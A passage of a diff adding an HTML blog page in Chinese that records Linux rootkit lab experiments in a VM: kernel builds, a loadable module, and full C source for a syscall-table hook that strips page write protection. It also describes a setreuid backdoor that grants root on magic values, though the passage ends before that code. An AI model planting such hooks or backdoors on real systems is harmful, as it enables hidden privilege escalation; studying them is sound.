@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/embpgp.github.io/function%20()%20%7B%0A%20%20%20%20%20%20for%20(var%20_len2%20=%20arguments.length,%20args%20=%20new%20Array(_len2),%20_key2%20=%200;%20_key2%20%3C%20_len2;%20_key2++)%20%7B%0A%20%20%20%20%20%20%20%20args%5B_key2%5D%20=%20arguments%5B_key2%5D;%0A%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20return%20obj%5Bval%5D.apply(obj,%20args);%0A%20%20%20%20%7D">
+
+<link rel="stylesheet" href="/embpgp.github.io/css/main.css">
+
+
+<link rel="stylesheet" href="/embpgp.github.io/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"embpgp.github.io","root":"/embpgp.github.io/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="参考:http:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;system&#x2F;54263.htmlhttps:&#x2F;&#x2F;chirath02.wordpress.com&#x2F;tag&#x2F;asmlinkage&#x2F;r00tk1t基础实验https:&#x2F;&#x2F;memset.wordpress.com&#x2F;2010&#x2F;12&#x2F;28&#x2F;syscall-hijacking-simple-rootkit-kernel-2-6-x&#x2F;http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="r00tk1t init">
+<meta property="og:url" content="https://embpgp.github.io/2017/01/12/r00tk1t-init/index.html">
+<meta property="og:site_name" content="rutk1t0r&#39;s blog">
+<meta property="og:description" content="参考:http:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;system&#x2F;54263.htmlhttps:&#x2F;&#x2F;chirath02.wordpress.com&#x2F;tag&#x2F;asmlinkage&#x2F;r00tk1t基础实验https:&#x2F;&#x2F;memset.wordpress.com&#x2F;2010&#x2F;12&#x2F;28&#x2F;syscall-hijacking-simple-rootkit-kernel-2-6-x&#x2F;http">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2017-01-12T13:33:55.000Z">
+<meta property="article:modified_time" content="2025-03-11T12:14:38.967Z">
+<meta property="article:author" content="rutk1t0r">
+<meta property="article:tag" content="C&#x2F;C++">
+<meta property="article:tag" content="exploit">
+<meta property="article:tag" content="r00tk1t">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://embpgp.github.io/2017/01/12/r00tk1t-init/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>r00tk1t init | rutk1t0r's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/embpgp.github.io/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rutk1t0r's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Developer and Researcher</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/embpgp.github.io/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/embpgp.github.io/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/embpgp.github.io/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">29</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/embpgp.github.io/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/embpgp.github.io/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">39</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/embpgp.github.io/schedule/notes.html" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://embpgp.github.io/2017/01/12/r00tk1t-init/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/embpgp.github.io/images/avatar.png">
+      <meta itemprop="name" content="rutk1t0r">
+      <meta itemprop="description" content="gnireenigne 0x41414141 \xff\xe4\xcc">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rutk1t0r's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          r00tk1t init
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-01-12 21:33:55" itemprop="dateCreated datePublished" datetime="2017-01-12T21:33:55+08:00">2017-01-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-03-11 20:14:38" itemprop="dateModified" datetime="2025-03-11T20:14:38+08:00">2025-03-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/embpgp.github.io/categories/study/" itemprop="url" rel="index"><span itemprop="name">study</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/embpgp.github.io/categories/study/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>14k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>13 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>参考:<br><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/system/54263.html">http://www.freebuf.com/articles/system/54263.html</a><br><a target="_blank" rel="noopener" href="https://chirath02.wordpress.com/tag/asmlinkage/">https://chirath02.wordpress.com/tag/asmlinkage/</a><br><a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655113676&idx=3&sn=07e450fb7553f87fa3c9fa5fd186c5b0&chksm=bc864c238bf1c5350ddc594555f4412faa42df025d49e2364884b851d7ea9a1e2d1cfda697d4#rd">r00tk1t基础实验</a><br><a target="_blank" rel="noopener" href="https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/">https://memset.wordpress.com/2010/12/28/syscall-hijacking-simple-rootkit-kernel-2-6-x/</a><br><a target="_blank" rel="noopener" href="https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/">https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/</a><br><a target="_blank" rel="noopener" href="http://www.mallocfree.com/data/compile-linux-kernel-mallocfree.com.pdf">http://www.mallocfree.com/data/compile-linux-kernel-mallocfree.com.pdf</a><br><a target="_blank" rel="noopener" href="https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/">https://ruinedsec.wordpress.com/2013/04/04/modifying-system-calls-dispatching-linux/</a></p>
+<span id="more"></span>
+
+
+<h1 id="What’s-this"><a href="#What’s-this" class="headerlink" title="What’s this?"></a>What’s this?</h1><p>关于其概念可以参考<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Rootkit">维基百科</a>。</p>
+<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>建议不要在物理机下实验~因此我根据<a target="_blank" rel="noopener" href="https://chirath02.wordpress.com/tag/asmlinkage/">这里</a>介绍的情况便去ubuntu的官方网站下载了ubuntu 15.10的i386镜像。然后用VMWare安装ISO，便开始按照里面的指令进行修改和编译。其中增加的系统调用是根据上述的<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MjM5OTk4MDE2MA==&mid=2655113676&idx=3&sn=07e450fb7553f87fa3c9fa5fd186c5b0&chksm=bc864c238bf1c5350ddc594555f4412faa42df025d49e2364884b851d7ea9a1e2d1cfda697d4#rd">r00tk1t</a>增加的。修改系统调用是主要的方式之一，因此可以借鉴。</p>
+<h1 id="编译部分"><a href="#编译部分" class="headerlink" title="编译部分"></a>编译部分</h1><p>为了方便可以直接在虚拟机里面切换到root用户，然后键入<code># apt-get source linux-image-$(uname -r)</code>即可下载虚拟机本内核源代码。然后cp到/usr/src目录，再解压出来。然后安装编译所需要的一些依赖工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get build-dep linux-image-$(uname -r)</span><br><span class="line">$ sudo apt-get install kernel-package  <span class="comment"># for make-kpkg clean</span></span><br><span class="line">$ sudo apt-get install libncurses-dev  <span class="comment"># for make menuconfig</span></span><br></pre></td></tr></table></figure>
+<p>再之后按照教程部分增加系统调用，照葫芦画瓢。然后就<code>make menuconfig</code>配置内核编译选项，教程给的是默认(不知道修改是否编译快一些)。而后便可以开始漫长的编译过程了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo make</span><br><span class="line">sudo make modules_install˖</span><br><span class="line">sudo make install</span><br><span class="line">sudo mkinitramfs -o /boot/initrd.img-2.6.32.65</span><br><span class="line">sudo update-initramfs -c -k 2.6.32.65</span><br><span class="line">sudo update-grub2 </span><br><span class="line"></span><br><span class="line">sudo vim /etc/default/grub     //注释掉下面的部分</span><br><span class="line"><span class="comment">#GRUB_HIDDEN_TIMEOUT=0</span></span><br><span class="line">sudo update-grub2 </span><br></pre></td></tr></table></figure>
+<p>上述参考mallocfree的教程。可以使得不用完全覆盖掉原有内核选项而使得grub增加新的选项来供用户选择。<br>按照教程第一部分部分结果如下:至少我们工程的从内核任务链表中实现了相应的功能。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@r00t:~<span class="comment"># uname -r</span></span><br><span class="line">4.2.2</span><br><span class="line">root@r00t:~<span class="comment"># ps aux | grep sshd</span></span><br><span class="line">root       655  0.0  0.5  10432  5320 ?        Ss   20:13   0:00 /usr/sbin/sshd -D</span><br><span class="line">root      1144  0.0  0.6  13652  6268 ?        Ss   20:13   0:00 sshd: r00t [priv]   </span><br><span class="line">r00t      1209  0.1  0.2  13652  2948 ?        S    20:13   0:00 sshd: r00t@pts/8    </span><br><span class="line">root      1248  0.0  0.6  13652  6196 ?        Ss   20:14   0:00 sshd: r00t [priv]   </span><br><span class="line">r00t      1285  0.0  0.2  13652  2960 ?        S    20:14   0:00 sshd: r00t@pts/9    </span><br><span class="line">root      1330  0.0  0.2   5972  2308 pts/8    S+   20:19   0:00 grep --color=auto sshd</span><br><span class="line">root@r00t:~<span class="comment"># ./testPname </span></span><br><span class="line">Enter process to find</span><br><span class="line">sshd</span><br><span class="line">PID = 655</span><br><span class="line">         PID = 1144</span><br><span class="line">                   PID = 1209</span><br><span class="line">                             PID = 1248</span><br><span class="line">                                       PID = 1285</span><br><span class="line">                                                 System call returned 0</span><br><span class="line">root@r00t:~<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="LKM"><a href="#LKM" class="headerlink" title="LKM"></a>LKM</h1><p>按照freebuf的教程第一个LKM程序编译如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@r00t:~/LKM<span class="comment"># make</span></span><br><span class="line">make -C /lib/modules/4.2.2/build SUBDIRS=/root/LKM modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">  CC [M]  /root/LKM/lkm.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /root/LKM/lkm.mod.o</span><br><span class="line">  LD [M]  /root/LKM/lkm.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-4.2.2&#x27;</span></span><br><span class="line">root@r00t:~/LKM<span class="comment"># insmod lkm.ko </span></span><br><span class="line">root@r00t:~/LKM<span class="comment"># dmesg | tail -n 1</span></span><br><span class="line">[ 4019.602327] Arciryas:module loaded</span><br><span class="line">root@r00t:~/LKM<span class="comment"># lsmod | grep lkm</span></span><br><span class="line">lkm                    16384  0</span><br><span class="line">root@r00t:~/LKM<span class="comment"># rmmod lkm.ko</span></span><br><span class="line">root@r00t:~/LKM<span class="comment"># dmesg | tail -n 2</span></span><br><span class="line">[ 4019.602327] Arciryas:module loaded</span><br><span class="line">[ 4117.988381] Arciryas:module removed</span><br><span class="line">root@r00t:~/LKM<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Kernel-Hook"><a href="#Kernel-Hook" class="headerlink" title="Kernel Hook"></a>Kernel Hook</h1><ul>
+<li>静态的方式获得syscall表的地址<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@r00t:~<span class="comment"># !cat</span></span><br><span class="line">cat /boot/System.map-4.2.2 | grep sys_call_table</span><br><span class="line">c1755140 R sys_call_table</span><br><span class="line">root@r00t:~<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li>hook代码如下,稍微大概解释以下，内核模块在初始化的时候会检查sys_call_table的内存地址是否可写，一般情况下肯定是不能写的，上面的System.map文件中也看到的，因此程序会检查并通过改写其对应的内存页读写属性来强行修改表借此来hook。在模块卸载的时候又将原来的地址修改回来。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@r00t:~/LKM/pname<span class="comment"># cat captainhook.c</span></span><br><span class="line"><span class="comment">#include &lt;asm/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/cacheflush.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/init.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/kernel.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/syscalls.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/pgtable_types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/highmem.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/fs.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/moduleparam.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;asm/cacheflush.h&gt;</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;rutk1t0r&quot;</span>);</span><br><span class="line">/*MY sys_call_table address*/</span><br><span class="line">//c1755140</span><br><span class="line">void **system_call_table_addr;</span><br><span class="line">/*my custom syscall that takes process name*/</span><br><span class="line">asmlinkage int (*custom_syscall) (char* name);</span><br><span class="line">/*hook*/</span><br><span class="line">asmlinkage int captain_hook(char* play_here) &#123;</span><br><span class="line">    /*<span class="keyword">do</span> whatever here (<span class="built_in">print</span> <span class="string">&quot;HAHAHA&quot;</span>, reverse their string, etc)</span><br><span class="line">        But <span class="keyword">for</span> now we will just <span class="built_in">print</span> to the dmesg <span class="built_in">log</span>*/</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Pname Syscall:HOOK! HOOK! HOOK! HOOK!...ROOOFFIIOO!&quot;</span>);</span><br><span class="line">    <span class="built_in">return</span> custom_syscall(play_here);</span><br><span class="line">&#125;</span><br><span class="line">/*Make page writeable*/</span><br><span class="line">int make_rw(unsigned long address)&#123;</span><br><span class="line">    unsigned int level;</span><br><span class="line">    pte_t *pte = lookup_address(address, &amp;level);</span><br><span class="line">    <span class="keyword">if</span>(pte-&gt;pte &amp;~_PAGE_RW)&#123;</span><br><span class="line">        pte-&gt;pte |=_PAGE_RW;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">/* Make the page write protected */</span><br><span class="line">int make_ro(unsigned long address)&#123;</span><br><span class="line">    unsigned int level;</span><br><span class="line">    pte_t *pte = lookup_address(address, &amp;level);</span><br><span class="line">    pte-&gt;pte = pte-&gt;pte &amp;~_PAGE_RW;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">static int __init entry_point(void)&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Captain Hook loaded successfully..\n&quot;</span>);</span><br><span class="line">    /*MY sys_call_table address*/</span><br><span class="line">    system_call_table_addr = (void*)0xc1755140;</span><br><span class="line">    /* Replace custom syscall with the correct system call name (write,open,etc) to hook*/</span><br><span class="line">    custom_syscall = system_call_table_addr[__NR_pname];</span><br><span class="line">    /*Disable page protection*/</span><br><span class="line">    make_rw((unsigned long)system_call_table_addr);</span><br><span class="line">    /*Change syscall to our syscall <span class="keyword">function</span>*/</span><br><span class="line">    system_call_table_addr[__NR_pname] = captain_hook;</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">static int __exit exit_point(void)&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;Unloaded Captain Hook successfully\n&quot;</span>);</span><br><span class="line">    /*Restore original system call */</span><br><span class="line">    system_call_table_addr[__NR_pname] = custom_syscall;</span><br><span class="line">    /*Renable page protection*/</span><br><span class="line">    make_ro((unsigned long)system_call_table_addr);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">module_init(entry_point);</span><br><span class="line">module_exit(exit_point);</span><br></pre></td></tr></table></figure></li>
+<li>结果如下:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@r00t:~/LKM/pname<span class="comment"># insmod captainhook.ko</span></span><br><span class="line">root@r00t:~/LKM/pname<span class="comment"># cd</span></span><br><span class="line">root@r00t:~<span class="comment"># ./testPname </span></span><br><span class="line">Enter process to find</span><br><span class="line">sshd</span><br><span class="line">PID = 655</span><br><span class="line">         PID = 1144</span><br><span class="line">                   PID = 1209</span><br><span class="line">                             PID = 1248</span><br><span class="line">                                       PID = 1285</span><br><span class="line">                                                 System call returned 0</span><br><span class="line">root@r00t:~<span class="comment"># rmmod captainhook</span></span><br><span class="line">root@r00t:~<span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## dmesg中输出如下:</span></span><br><span class="line">[ 1月13 21:49] Captain Hook loaded successfully..</span><br><span class="line">[ 1月13 21:50] Pname Syscall:HOOK! HOOK! HOOK! HOOK!...ROOOFFIIOO!</span><br><span class="line">[ +11.875845] Unloaded Captain Hook successfully</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="动态获取系统调用表"><a href="#动态获取系统调用表" class="headerlink" title="动态获取系统调用表"></a>动态获取系统调用表</h1>依照<a target="_blank" rel="noopener" href="https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/">这篇文章</a>复制过来的代码以及编译运行的结果如下,对于我的虚拟机ubuntu 15.10的4.2.2的内核而言，我修改了模块代码的两个地方(因为这两个地方报错)。第一处是kmalloc和kfree函数未实现，因此加入<code>#include &lt;linux/slab.h&gt;</code>头文件即可。第二处是new结构体指针的uid和gid几个字段赋值强转失败，查看源码后改为宏<code>GLOBAL_ROOT_UID</code>和<code>GLOBAL_ROOT_GID</code>即可。而以下代码的大体意思就是动态地在模块被加载的时候hook掉setreuid系统调用，硬编码写死一个触发条件<code>if ((ruid == 7310) &amp;&amp; (euid == 0137))</code>即应用层传递过来的参数如果满足即可根据cred来获取root权限。因此如果被种植类似这样的后门是很危险的，只要低权限账户运行test程序即可获取root权限。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 